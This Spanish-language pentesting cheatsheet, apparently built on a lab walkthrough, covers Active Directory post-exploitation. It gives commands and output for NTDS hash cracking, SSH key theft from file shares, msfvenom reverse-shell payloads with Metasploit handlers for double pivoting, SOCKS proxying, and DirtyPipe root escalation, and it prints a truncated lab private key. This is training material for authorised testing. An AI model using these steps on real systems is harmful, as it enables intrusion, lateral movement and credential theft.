
# Post Explotación en Active Directory

Una vez que hayamos comprometido el dominio, dependiendo del tipo de evaluación, nuestro trabajo no termina. Hay muchas cosas que podemos hacer para agregar valor adicional a nuestros clientes. Si el objetivo de la evaluación era alcanzar el nivel `Domain Admin` y nada más, entonces hemos terminado y debemos asegurarnos de tener todos los resultados de comandos/registros, datos de escaneo y capturas de pantalla, y continuar elaborando el informe.&#x20;

Si la evaluación se centró en un objetivo (es decir, obtener acceso a una base de datos específica), debemos seguir trabajando para lograrlo. Los derechos de administrador del dominio pueden ser solo el comienzo, ya que podría haber otras redes, dominios o bosques en juego a los que tendremos que acceder. Si la evaluación es más abierta y el cliente nos pidió que demostráramos el mayor impacto posible, hay varias cosas que podemos hacer para agregar valor y ayudarlos a mejorar su seguridad.

***

## <mark style="color:purple;">Análisis de contraseñas de dominio: descifrado de NTDS</mark>

Tras descargar la base de datos NTDS, podemos descifrar contraseñas sin conexión con Hashcat. Una vez agotadas todas las reglas y listas de palabras posibles en nuestro equipo de descifrado, deberíamos usar una herramienta como DPAT para realizar un análisis de contraseñas de dominio.&#x20;

{% embed url="<https://github.com/clr2of8/DPAT>" %}

```bash
git clone https://github.com/clr2of8/DPAT.git
pip install pycryptodome
```

#### Generar hashcat.potfile

```bash
hashcat -m 1000 hashes.ntds /usr/share/wordlists/rockyou.txt --potfile-path hashcat.potfile
```

#### Ejecutar DPAT

```bash
python dpat.py -n hashes.ntds -c hashcat.potfile -p 8
```

Esto puede complementar de forma eficaz hallazgos como `Weak Active Directory Passwords Allowed` que anotamos tras un ataque de Password Spraring exitoso. Este análisis puede ayudar a aclarar el punto y puede ser una herramienta visual muy útil. Nuestro análisis puede incluirse en los apéndices del informe con métricas como:

* Número de hashes de contraseña obtenidos
* Número de hashes de contraseñas descifrados
* Porcentaje de hashes de contraseñas descifrados
* Las 10 mejores contraseñas
* Desglose de la longitud de la contraseña
* Número de contraseñas de administrador de dominio descifradas
* Número de contraseñas de administrador empresarial descifradas

***

## <mark style="color:purple;">Auditoría de seguridad de Active Directory</mark>

Como se explicó en el módulo [Técnicas adicionales de auditoría en AD](/ethical-hacking-cheatsheet/active-directory/active-directory/tecnicas-adicionales-de-auditoria-en-ad.md), podemos ofrecer un valor añadido a nuestros clientes profundizando en Active Directory, encontrando recomendaciones de buenas prácticas y presentándolas en los apéndices de nuestro informe.&#x20;

La herramienta [PingCastle](https://www.pingcastle.com/) es excelente para auditar la seguridad general del dominio y, a partir del informe que genera, podemos extraer diversos elementos para ofrecer a nuestros clientes recomendaciones sobre cómo reforzar su entorno de AD. Este tipo de trabajo, que va más allá de lo esperado, puede generar confianza con nuestros clientes y generar clientes recurrentes y recomendaciones. Es una excelente manera de diferenciarnos, demostrar los riesgos que afectan a los entornos de AD y demostrar nuestro profundo conocimiento de la red del cliente.

***

## <mark style="color:purple;">Búsqueda de datos/hosts confidenciales</mark>

Una vez que accedamos al controlador de dominio, probablemente podamos acceder a la mayoría de los recursos del dominio. Si queremos demostrar el impacto para nuestros clientes, un buen punto de partida es revisar los recursos compartidos de archivos para ver qué otros tipos de datos podemos ver.&#x20;

Como se explicó en el módulo [`Documentación e informes`](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/documentacion-e-informes.md), debemos asegurarnos de tomar capturas de pantalla que muestren la lista de archivos si encontramos un recurso compartido particularmente sensible, y no abrir archivos individuales, tomar capturas de pantalla ni eliminar archivos de la red.

```shell-session
afsh4ck@kali$ proxychains evil-winrm -i 172.16.8.3 -u Administrator -H "fd1f7e5564060258ea787ddbb6e6afa2"afa2

ProxyChains-3.1 (http://proxychains.sf.net)

<SNIP>

Evil-WinRM* PS C:\Users\Administrator\desktop> cd c:\

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK

*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Department Shares
d-----        9/15/2018  12:12 AM                PerfLogs
d-r---       12/14/2020   6:43 PM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---         6/1/2022  11:07 AM                Users
d-----         6/1/2022  11:10 AM                Windows
```

Regresemos al recurso compartido `Department Shares` y veamos qué más podemos encontrar.

```powershell
*Evil-WinRM* PS C:\> cd "Department Shares"
*Evil-WinRM* PS C:\Department Shares> dir

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK


    Directory: C:\Department Shares
    

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Accounting
d-----         6/1/2022  11:34 AM                Executives
d-----         6/1/2022  11:34 AM                Finance
d-----         6/1/2022  11:33 AM                HR
d-----         6/1/2022  11:33 AM                IT
d-----         6/1/2022  11:33 AM                Marketing
d-----         6/1/2022  11:33 AM                R&D
```

Dependiendo del sector y el negocio del cliente, existen diversos aspectos que podemos analizar para demostrar el impacto. Los datos de RR. HH., como salarios y bonificaciones, deben estar bien protegidos. La información de I+D podría perjudicar a una empresa si se filtra, por lo que deben implementar controles adicionales.&#x20;

Es recomendable no permitir que los administradores de dominio tengan acceso general a todos los datos, ya que si una cuenta se ve comprometida, se comprometerá todo. Algunas empresas cuentan con un sitio web independiente, un recurso compartido de archivos o un servidor de respaldo no perteneciente al dominio para almacenar datos confidenciales. En nuestro caso, Inlanefreight nos solicitó que probáramos si podemos acceder a algún host de la subred `172.16.9.0/23`. Esta es su red de administración y alberga servidores confidenciales a los que no se debería acceder directamente desde los hosts del dominio principal, y obtener derechos de administrador de dominio no debería implicar un acceso inmediato.

Dentro del recurso compartido de IT privado, podemos ver dos subdirectorios: `Development` y `Networking`. El subdirectorio Development contiene el script de copia de seguridad que obtuvimos anteriormente. Analicemos el subdirectorio Networking.

```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private> ls


    Directory: C:\Department Shares\IT\Private


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Development
d-----         6/1/2022  11:34 AM                Networking
```

```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ls


    Directory: C:\Department Shares\IT\Private\Networking


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022  11:34 AM           1706 harry-id_rsa
-a----         6/1/2022  11:34 AM           1702 james-id_rsa
-a----         6/1/2022  11:34 AM           1706 ssmallsadm-id_rsa
```

Podemos ver las claves privadas SSH de tres usuarios diferentes, destacando el del usuario ssmallsadm (que parece un administrador) . Esto es interesante.

`¿Es posible aprovechar alguno de estos usuarios para acceder a un host en la red protegida?`

### Adaptadores de red interna

Al observar los adaptadores de red en los controladores de dominio, podemos ver que tiene una segunda NIC en la red `172.16.9.0`.

```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-16-51
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::8c6e:6173:2179:e0a5%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.8.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.8.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-29-62-C9-00-50-56-B9-16-51
   DNS Servers . . . . . . . . . . . : ::1
                                       127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B9-3A-88
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::ad24:d126:19f:f31d%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.9.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.9.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-29-62-C9-00-50-56-B9-16-51
   DNS Servers . . . . . . . . . . . : ::1
                                       127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

### Ping Sweep de red interna

Escribir `arp -a` para ver la tabla arp no arroja resultados interesantes. Podemos usar PowerShell para realizar un ping sweep e intentar identificar hosts activos.

{% hint style="warning" %}
Dependiendo de la conexión puede que tengamos que ejecutarlo varias veces para encontrar los hosts activos
{% endhint %}

```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
172.16.9.1: False
172.16.9.2: False
172.16.9.3: True
172.16.9.4: False

<SNIP>

172.16.9.24: False
172.16.9.25: True
172.16.9.26: False
172.16.9.27: False

<SNIP>
```

Vemos un host activo, `172.16.9.25`, con el que quizás funcione una de las claves privadas SSH. ¡Manos a la obra! Primero, descarguemos las claves SSH mediante nuestra conexión `evil-winrm` al controlador de dominio.

```powershell
Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa 

Info: Downloading C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa to /tmp/ssmallsadm-id_rsa

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> 
```

***

## <mark style="color:purple;">El doble pivoting - MGMT01</mark>

Ahora bien, hay varias maneras de realizar la siguiente parte. Tomaremos la ruta larga para poder acceder por SSH directamente al host `172.16.9.25` desde nuestra máquina de ataque, realizando un doble pivoting complejo en el proceso.&#x20;

Esto es lo que intentamos lograr: comenzamos desde nuestro host de ataque y pivotamos a través de los hosts `dmz01` y `DC01` para poder acceder por SSH directamente al host MGMT01, a dos saltos de distancia.

`Máquina atacante` -> `dmz01` -> `DC01` -> `MGMT01`

<figure><img src="/files/VLTJRSR9LkGlTisecrnZ" alt=""><figcaption></figcaption></figure>

Necesitaremos establecer un reverse shell desde el host `dmz01` hasta nuestro host de ataque. Podemos hacerlo de la misma manera que en la sección [`Recopilación de información interna`](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/pruebas-internas/recopilacion-de-informacion-interna.md): crear un payload ELF, subirlo al objetivo y ejecutarlo para capturar un shell. Comenzamos creando el payload ELF y subiéndolo al host `dmz01` mediante SCP.

```shell-session
afsh4ck@kali$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.191 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

```shell-session
afsh4ck@kali$ scp -i dmz01_key shell.elf root@10.129.14.97:/    
shell.elf                                                             100%  207     4.7KB/s   00:00 
```

A continuación, configuramos un Multi Handler con Metasploit:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.129.14.97; set LPORT 443; run" 
```

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.129.14.97
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.129.14.97:443
```

Ejecutamos el archivo `shell.elf` en el host `dmz01`:

```shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

Capturamos el shell Meterpreter usando multi/handler:

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.129.14.97:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.129.14.97:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```

A continuación, configuramos una regla de Port Forwarding local para reenviar todo el tráfico destinado al puerto `1234` de `dmz01` al puerto `8443` en nuestro host de ataque.

```bash
(Meterpreter 1)(/root) > portfwd add -R -l 8443 -p 1234 -L 10.10.15.191
[*] Reverse TCP relay created: (remote) :1234 -> (local) [::]:1234
```

A continuación, creamos un payload ejecutable que cargaremos en el controlador de dominio.

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: dc_shell.exe
```

Subimos el payload al Domain Controller mediante la sesión de Evil-WinRM:

```powershell
*Evil-WinRM* PS C:\> upload "/home/kali/Escritorio/machines/htb/academy/inlanefreight/dc_shell.exe"
                                        
Info: Uploading /home/kali/Escritorio/machines/htb/academy/enterprise/dc_shell.exe to C:\\dc_shell.exe
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
```

Llevamos la sesión de Meterpreter al background:

```bash
(Meterpreter 1)(/root) > bg
[*] Backgrounding session 1...
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >>
```

Iniciamos otro multi/handler en la misma sesión msfconsole para capturar el shell del DC.

```bash
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lhost 0.0.0.0
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lport 8443
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> exploit
```

Ejecutamos el payload en el DC y, si todo va según lo planeado, la capturaremos en nuestro listener.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
```

Al revisar nuestro multi handler, vemos la conexión entrante. Parece provenir de 0.0.0.0 porque nuestra regla de Port Forwarding, establecida anteriormente, especificó que todo el tráfico destinado a nuestro host en el puerto 1234 debe dirigirse a nuestro receptor en el puerto 8443.

```bash
[*] Started reverse TCP handler on 0.0.0.0:8443
[*] Sending stage (200262 bytes) to 10.129.14.97
[*] Meterpreter session 2 opened (10.129.14.97:8443 -> 10.129.14.97:46313 ) at 2022-06-22 21:36:20 -0400

meterpreter > getuid
Server username: INLANEFREIGHT\Administrator

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 3
Meterpreter     : x64/windows
```

Para nuestro próximo truco, configuraremos una ruta a la subred `172.16.9.0/23`.

```shell-session
(Meterpreter 2)(C:\) > run autoroute -s 172.16.9.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.9.0/255.255.254.0...
[+] Added route to 172.16.9.0/255.255.254.0 via 10.10.14.15
[*] Use the -p option to list all active routes
```

Podemos confirmarlo comprobando la tabla de enrutamiento de MSF:

```shell-session
(Meterpreter 2)(C:\) > background
[*] Backgrounding session 2...
[msf](Jobs:0 Agents:2) exploit(multi/handler) >> route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.9.0         255.255.254.0      Session 2
```

Ahora necesitamos configurar un proxy Socks, que es el paso final antes de que podamos comunicarnos directamente con la red `172.16.9.0/23` desde nuestro host de ataque.

```shell-session
[msf](Jobs:0 Agents:2) exploit(multi/handler) >> use auxiliary/server/socks_proxy 
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This
                                        must be an address on the local machine or 0.0.0.0 to l
                                        isten on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set srvport 9050
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set version 4a
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.
[msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> 
[*] Starting the SOCKS proxy server
```

Editamos el archivo `/etc/proxychains4.conf` para usar el puerto `9050` especificado anteriormente. Si ya tienes una línea anterior, coméntala o reemplaza el número de puerto.

```bash
# defaults set to "tor"
#socks4 	127.0.0.1 9050
#socks4 127.0.0.1 8081
socks4 127.0.0.1 9050
```

Ahora podemos probar esto ejecutando Nmap contra el objetivo y confirmamos que podemos escanearlo.

```shell-session
afsh4ck@kali$ proxychains nmap -sT -p 22 172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 21:42 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:80-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
Nmap scan report for 172.16.9.25
Host is up (1.1s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

Finalmente, podemos probar cada clave SSH con proxychains para intentar conectarnos al host. Podemos recopilar cada nombre de usuario por el nombre de archivo de la clave SSH. En nuestro caso, la clave `ssmallsadm` funciona.

{% hint style="warning" %}
&#x20;No olvides dar permisos `chmod 600` al archivo id\_rsa o no podremos conectarnos.
{% endhint %}

```shell-session
afsh4ck@kali$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 23 Jun 2022 01:48:14 AM UTC

  System load:  0.0                Processes:               231
  Usage of /:   27.9% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens192: 172.16.9.25
  Swap usage:   0%


159 updates can be applied immediately.
103 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
```

Como paso final, enumeraremos el sistema objetivo y comprobaremos si existen oportunidades de escalada de privilegios locales. Si logramos obtener acceso root, habremos cumplido el objetivo principal del cliente, ya que afirmó que este servidor alberga sus datos más importantes.&#x20;

## <mark style="color:purple;">Elevación de privilegios</mark>

Durante nuestra enumeración, realizamos una búsqueda en Google basada en la versión del kernel y observamos que probablemente sea vulnerable a `CVE-2022-0847` [DirtyPipe](https://www.cisa.gov/uscert/ncas/current-activity/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux). Podemos encontrar una excelente explicación de esta vulnerabilidad en el [blog Hack The Box](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847) .

```shell-session
ssmallsadm@MGMT01:~$ uname -a

Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Usaremos exploit-2 de [este repositorio de GitHub](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) . Como tenemos acceso SSH al sistema, podemos crear un archivo `dirtypipe.c` con `Vim`, copiar el código del exploit y pegarlo. Luego debemos compilarlo y, por suerte, `gcc` ya está presente en el sistema.

```shell-session
ssmallsadm@MGMT01:~$ vim dirtypipe.c
```

Aquí pegamos el exploit y lo guardamos con `:wq`

```bash
:wq
"dirtypipe.c" [New] 214L, 7311C written
```

```shell-session
ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe 

Usage: ./dirtypipe SUID
```

Debemos ejecutar el exploit contra un binario SUID para inyectar y sobrescribir memoria en un proceso raíz. Primero, debemos buscar los binarios SUID en el sistema.

```shell-session
ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount

<SNIP>
```

Por último, ejecutaremos el exploit contra el binario `/usr/lib/openssh/ssh-keysign` y conseguimos un shell root.

```shell-session
ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),1001(ssmallsadm)
```

Desde aquí podríamos realizar una post-explotación del sistema de archivos para demostrar el nivel de acceso que logramos.

***

## <mark style="color:purple;">Simulación de exfiltración de datos</mark>

Algunos clientes podrían querer probar sus capacidades `Data Loss Prevention`(`DLP`), por lo que podríamos experimentar con diversas maneras de extraer datos ficticios de su red para ver si nos detectan. Debemos colaborar con el cliente para comprender qué tipos de datos intenta proteger y proceder en consecuencia. Es mejor usar datos ficticios para no tener que gestionar datos altamente sensibles del cliente en nuestro sistema de pruebas.

***

## <mark style="color:purple;">Ataque a Domain Trusts</mark>

Si existen confianzas de dominio, podríamos usar nuestras habilidades para enumerar estas relaciones y explotar una relación de confianza entre dominios secundarios y primarios, una confianza dentro del bosque o una confianza externa. Antes de hacerlo, debemos verificar con el cliente que el dominio objetivo esté dentro del alcance de las pruebas. En ocasiones, comprometemos un dominio menos importante y podemos usar este acceso para controlar completamente el dominio principal.&#x20;

Esto puede ser muy valioso para el cliente, ya que podría haber establecido relaciones de confianza precipitadamente como resultado de una fusión y adquisición o de la conexión con otra organización. Su dominio puede estar bien protegido, pero ¿qué sucede si logramos aplicar Kerberoasting a una confianza de bosque, comprometemos un bosque asociado y luego encontramos una cuenta en el bosque asociado con derechos de administrador completos en nuestro dominio actual? En esta situación, podríamos demostrarle a nuestro cliente que la principal debilidad no reside en el dominio en el que estamos realizando las pruebas, sino en otro, para que pueda proceder en consecuencia.

***

## <mark style="color:purple;">Reflexiones finales</mark>

Esta sección mostró lo que podemos hacer en post-explotación para obtener la Administración de Dominio en un entorno de cliente. Presenciar, dominar al cliente y presumir de la rapidez con la que se obtuvo el Domain Admin no beneficia al cliente ni ayuda a usted ni a su empresa a retener clientes ni a crear una sólida reputación. Lo que hacemos después de obtener la Administración de Dominio es extremadamente importante y es aquí donde podemos diferenciarnos de otros pentesters que simplemente ejecutan Responder, algunas otras herramientas y scripts, un análisis de Nessus, emiten un informe de inventario y listo.

El informe debe demostrar el valor de la prueba de penetración por la que su cliente está pagando, y podemos asegurarnos de que esté satisfecho y vuelva en los próximos años si superamos las expectativas. Esto no siempre es posible debido a las restricciones contractuales y las evaluaciones con plazos limitados, pero incluso si podemos ofrecer un pequeño extra, estamos a la vanguardia. Tenga en cuenta que los aspectos que identificamos en nuestro informe pueden afectar la financiación de un cliente para el año siguiente, y es probable que dicha financiación incluya pruebas de penetración. No queremos inflar el informe con hallazgos sin sentido, por supuesto, pero a menudo podemos identificar muchas cosas que nuestro cliente ni siquiera había considerado y tanto él como usted saldrán beneficiados por ello.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.229.147
```

### Pregunta 1

> Obtén acceso al host MGMT01 y envíe el contenido del archivo `flag.txt` en el directorio de inicio de un usuario.

#### Obtener id\_rsa de los usuarios

En los Department Shares encontramos el `id_rsa` del usuario administrador `ssmallsadm`:

```powershell
Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ls


    Directory: C:\Department Shares\IT\Private\Networking


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022  11:34 AM           1706 harry-id_rsa
-a----         6/1/2022  11:34 AM           1702 james-id_rsa
-a----         6/1/2022  11:34 AM           1706 ssmallsadm-id_rsa
```

Lo leemos con `type` y lo copiamos a un archivo en nuestro Kali:

```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> type ssmallsadm-id_rsa
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwRe2tmrKNSOvEfkdgH014WMvNk7fMvMQ9m31Kpo5g9S+/bCl
vWmldCVJT/udEbKK9TR+TnxPEisVwp6QDkB9y6PznCS8y4kz6WP5rV9YoIl8/yyS
INUPWVL/rRoFDTEPlOp5NNkwtBB0uhOBXlRaNb6CBDqEMuk3H8eUJPtxRCkNEwTA
1GcZ8BuUt/c5uWEBj8xz3mSuPpFLNl/SNRrDvcHG0b0aP3MmWpcifCj36IZ6Qzej
gqYZvyX2lY1xFLrvRqa6Gx6jl1bw//K7CTVwuHepDngqJvWaBc1AXWrmLUSPw25t
PWVPCiYD2UgFf6+YPmhB3Yf50Z+Kd0iPgN/HEQIDAQABAoIBAQCQY9o2eI6yw/dT
WlSsU3UqEJAqbTpMkCR8EmeFrwQZR8p2TFTz2f9mZcd3rvCaXke46sMUj7JVJLDF
8upILgOjdvthJLuk+/k8qoz3D1hn28gDzOGM+aXbpswYNl/WqHw9YES4tzzLOY7/
4jwYPL2keMwiu1tF8s1Mz2JBcWEWlMhUWfkh6QimRW1a7m2gZlRRdySVk2/GlN1J
uPO/9kBgaRYxWBNKC87/ExL9d6/usb6p6/2vG9ujUn/J/WlLNeHFf/cfGhF2K/BF
HKuQE5jUClvcxE7h1nmQNHiH/wT7rK0AN9tWAsKk8/XNtU1IYvMr2twxAPgOhTTq
LNSq6AwNAoGBAP7+yo12bjL6fxPC0SFZAGXj8YTz3ukI3DUymuGCVtc3+nWGmy9k
loH0z5WnzG2Hn3Zq+Lg6qb+Y82dQKm2ITg+K/gOmTKj8pAxI+3rl4h9B763q0c6d
EuHBZDgRUr7eGFsAFjrEUkmIvBxh8LxQi0Y3HsHowcDCFj0NefS5B71DAoGBAMHa
e4VivEcYeWWcBGeFtjIEVnl7i0OObz1wwu6NQkN75z3umlj12jqEpBiijgXhqgVN
ytF1r3nDKkDZgpxdq/9twOU5YiwVFB2MfJVD876+4QkwwrK+NxjJuwE4y4LKABaL
VMB3JsY3VSbI727D8GIPp8cYA0nDf4bIn+JfmFsbAoGASSznBZeB4kE+bHZQu2gm
FBdIvOWbB3bScrW1+pcDwrk+t7FMIVqVUm/ljkXcBWaRHVNvUrcK9X+4AeLgehRO
imlRocx8XVY64YekG02TCXNLi7ZCRS+QNpbf4rMd8sYbaSnqNy0VjCKgEOkOQ4w9
m4W/3tejmmRYK2cNo2vhy68CgYBsepjYwbHejyGP7MjCLZ8RSkAh5zK9cT1qwmkz
GTVVkkaK77TLx3iBeqxhZMXZILkGEsxGfnbdyosgkxd17S1M2Nwy6fO3+2uwRWeK
F+aUfThs7i5l2+/1HR5axq+L1wJJm1qoAYVfMqOh+puR/m/MUDpxPUzJwG7iu+5M
vXYCtQKBgQDV/fEEZuNd9GTKwcQCX3nP4Knk1G99taneKzpnI2GJEtbDBhAYNVCa
